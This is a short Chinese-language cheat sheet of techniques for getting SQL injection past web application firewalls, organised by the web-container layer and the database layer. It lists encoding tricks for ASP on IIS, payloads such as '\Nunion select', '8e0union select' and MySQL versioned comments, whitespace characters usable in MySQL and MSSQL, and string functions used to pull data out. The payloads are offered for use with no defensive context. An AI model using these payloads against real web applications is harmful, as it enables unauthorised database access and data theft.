`WAF类型`

`根据WEB应用程序特性进行Waf绕过`
    
Web应用层
    
    `web容器层`
    % 绕过   asp+iis   即s%elect
    
    %u 特性  asp（x）+ iis   select=s%u006c%u0006ect
    
    apache
    
数据库交互层
        
        \Nunion的形式 userid=\Nunion select 
        
        浮点数的形式如1.1,8.0  userid=1.1union select
        
        8e0的形式 userid=8e0union select
        
        利用/*!50000*/的形式 userid=1 un/*!*/ion /*!50000select*/
        
        Mysql中可以利用的空白字符有:%09,%0a,%0b,%0c,%0d,%a0；
        Mssql中可以利用的空白字符有:01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 
        字符串截取函数 
        Mid(version(),1,1)
        Substr(version(),1,1)
        Substring(version(),1,1)
        Lpad(version(),1,1)
        Rpad(version(),1,1)
        Left(version(),1)
        reverse(right(reverse(version()),1)
        字符串连接函数
        concat(version(),'|',user());
        concat_ws('|',1,2,3)
        字符串转换
        Char(49)
        Hex(‘a’)
        Unhex(61)
        MSSQL
        可以使用内联注释/**/    
